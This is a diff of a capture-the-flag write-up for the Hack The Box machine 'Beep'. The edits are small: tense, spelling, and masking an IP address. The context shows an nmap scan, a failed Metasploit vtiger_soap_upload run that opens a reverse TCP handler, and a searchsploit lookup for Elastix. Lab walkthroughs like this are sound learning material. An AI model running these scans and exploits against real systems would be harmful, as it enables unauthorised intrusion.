@@ -3,7 +3,7 @@ Date: 2019-10-20
 
 ## Enumeration
 
-As always, scan for open ports first...
+As always, scanned for open ports first...
 
 	$ nmap -A -T4 beep
 	Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 22:28 CDT
@@ -70,7 +70,7 @@ VTiger looked to be an opensource CRM - interesting - and the login page helpful
 
 	msf5 exploit(multi/http/vtiger_soap_upload) > run
 	
-	[*] Started reverse TCP handler on 10.10.14.23:4444 
+	[*] Started reverse TCP handler on 10.10.x.x:4444 
 	[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
 	[*] Exploit completed, but no session was created.
 	msf5 exploit(multi/http/vtiger_soap_upload) >
@@ -95,7 +95,7 @@ Before sinking too much time into that I ran __searchsploit__ on Elastix.
 	--------------------------------------- ----------------------------------------
 	Shellcodes: No Result
 
-The first few results are Cross Site Scripting, which wont help us here, the 4th I took a look at:
+The first few results are Cross Site Scripting, which won't help us here, the 4th I took a look at:
 
 	msf5 exploit(multi/http/vtiger_soap_upload) > searchsploit -p 37637
 	[*] exec: searchsploit -p 37637
